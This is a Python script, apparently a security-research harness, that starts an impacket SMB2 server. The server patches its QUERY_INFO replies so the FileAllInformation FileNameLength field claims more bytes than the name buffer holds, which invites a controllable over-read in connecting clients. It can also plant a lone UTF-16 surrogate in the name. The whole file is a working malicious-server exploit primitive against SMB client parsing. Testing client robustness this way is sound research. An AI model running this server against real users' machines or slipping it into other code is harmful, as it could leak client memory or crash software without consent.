#!/usr/bin/env python3
"""QUERY_INFO FileAllInformation reply with a controlled FileNameLength over-read.

usage: smbserv_qinfo2.py PORT UNITS DELTA
  name = 'A' * UNITS (2*UNITS bytes, no NUL halfwords)
  FileNameLength = 2*UNITS + 2*DELTA   (DELTA UTF-16 units past the buffer)
  OutputBufferLength = the real serialized payload length
"""
import os, sys
from impacket.smbserver import SimpleSMBServer, SMB2Commands

PORT = int(sys.argv[1]); UNITS = int(sys.argv[2]); DELTA = int(sys.argv[3])
SHARE = os.environ.get('SMB_SHARE', os.path.expanduser('~/smbshare'))
ORIG = SMB2Commands.smb2QueryInfo


def patched(connId, smbServer, recvPacket):
    res = ORIG(connId, smbServer, recvPacket)
    try:
        r0 = res[0] if res[0] is not None else res[1]
        cmd = r0[0] if isinstance(r0, (list, tuple)) else r0
        if 'Buffer' not in getattr(cmd, 'fields', {}) and 'Data' in getattr(cmd, 'fields', {}):
            cmd = cmd['Data']
        b = cmd['Buffer']
        if os.environ.get('SURROGATE'):
            name = b'A' * (2 * (UNITS - 1)) + b'\x00\xd8'   # U+D800 as UTF-16LE
        else:
            name = 'A' * UNITS
        b['NameInformation']['FileName'] = name
        b['NameInformation']['FileNameLength'] = 2 * UNITS + 2 * DELTA
        cmd['OutputBufferLength'] = len(b.getData())
        print('QINFO units=%d delta=%d buflen=%d fnlen=%d' %
              (UNITS, DELTA, cmd['OutputBufferLength'], b['NameInformation']['FileNameLength']), flush=True)
    except Exception as e:
        print('err', repr(e), flush=True)
    return res


SMB2Commands.smb2QueryInfo = staticmethod(patched)
srv = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=PORT)
srv.addShare('S', SHARE)
srv.setSMB2Support(True)
print('serving', flush=True)
srv.start()
